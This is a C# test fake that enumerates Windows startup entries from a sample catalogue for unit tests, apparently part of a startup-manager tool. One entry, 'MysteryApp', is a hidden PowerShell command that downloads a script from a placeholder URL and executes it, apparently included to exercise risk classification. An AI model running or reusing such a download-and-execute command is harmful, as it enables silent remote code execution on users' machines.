namespace WindowsBox.Core.Startup;

/// <summary>
/// Deterministic enumerator for unit tests and Linux CI. Never touches a host.
/// </summary>
public sealed class FakeStartupEnumerator : IStartupEnumerator
{
    private readonly List<StartupEntry> _entries;

    public FakeStartupEnumerator(IEnumerable<StartupEntry>? seed = null)
    {
        _entries = seed?.ToList() ?? CreateSampleCatalog();
    }

    public IReadOnlyList<StartupEntry> Enumerate(StartupEnumerateOptions? options = null)
    {
        options ??= new StartupEnumerateOptions();
        IEnumerable<StartupEntry> q = _entries;

        if (options.HideMicrosoft)
        {
            q = q.Where(e => !e.IsMicrosoft);
        }

        if (!options.IncludeDrivers)
        {
            q = q.Where(e => e.Location != StartupLocationKind.Driver);
        }

        if (!options.IncludeShellExtensions)
        {
            q = q.Where(e => e.Location != StartupLocationKind.ShellExtension);
        }

        if (!options.IncludeServices)
        {
            q = q.Where(e => e.Location != StartupLocationKind.Service);
        }

        if (!options.IncludeScheduledTasks)
        {
            q = q.Where(e => e.Location != StartupLocationKind.ScheduledTask);
        }

        return q.OrderBy(e => e.Location).ThenBy(e => e.Name).ToList();
    }

    public static List<StartupEntry> CreateSampleCatalog() =>
    [
        Entry("run.hkcu.onedrive", "OneDrive", StartupLocationKind.RunKeyHkcu,
            @"C:\Program Files\Microsoft OneDrive\OneDrive.exe /background", microsoft: true),
        Entry("run.hklm.securityhealth", "SecurityHealth", StartupLocationKind.RunKeyHklm,
            @"%windir%\system32\SecurityHealthSystray.exe", microsoft: true, risk: 0),
        Entry("folder.user.teams", "Microsoft Teams", StartupLocationKind.StartupFolderUser,
            @"C:\Users\Public\Desktop\Teams.lnk", microsoft: true, risk: 1),
        Entry("task.updater", "Contoso Updater", StartupLocationKind.ScheduledTask,
            @"C:\Program Files\Contoso\update.exe", microsoft: false, risk: 2),
        Entry("svc.sysmain", "SysMain", StartupLocationKind.Service,
            "SysMain", microsoft: true, risk: 0),
        Entry("drv.example", "ExampleFilter", StartupLocationKind.Driver,
            "ExampleFilter.sys", microsoft: false, risk: 3),
        Entry("shell.ctx", "ContosoShellExt", StartupLocationKind.ShellExtension,
            @"C:\Program Files\Contoso\shell.dll", microsoft: false, risk: 3),
        Entry("winlogon.userinit", "Userinit", StartupLocationKind.WinlogonUserinit,
            @"C:\Windows\system32\userinit.exe", microsoft: true, risk: 4),
        Entry("run.hkcu.unknown", "MysteryApp", StartupLocationKind.RunKeyHkcu,
            @"powershell -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://example')",
            microsoft: false),
    ];

    private static StartupEntry Entry(
        string id,
        string name,
        StartupLocationKind location,
        string command,
        bool microsoft,
        int? risk = null) =>
        new()
        {
            Id = id,
            Name = name,
            Location = location,
            Command = command,
            IsMicrosoft = microsoft,
            Publisher = microsoft ? "Microsoft Corporation" : null,
            Enabled = true,
            Risk = risk ?? StartupRiskClassifier.Classify(location, microsoft, command),
            SignatureStatus = microsoft ? "Signed (Microsoft)" : "Unknown",
        };
}
